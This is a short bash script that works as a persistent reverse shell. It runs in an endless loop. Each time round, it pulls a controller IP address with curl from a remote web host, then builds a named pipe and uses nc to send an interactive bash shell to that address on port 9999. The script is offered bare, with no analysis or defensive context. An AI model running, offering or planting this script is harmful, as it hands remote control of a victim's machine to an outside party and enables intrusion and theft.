#!/bin/bash
while true; do

IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
PORT="9999"
rm -rf /tmp/f
# mkdir /tmp
mkfifo /tmp/f
# echo $IP
cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f


done
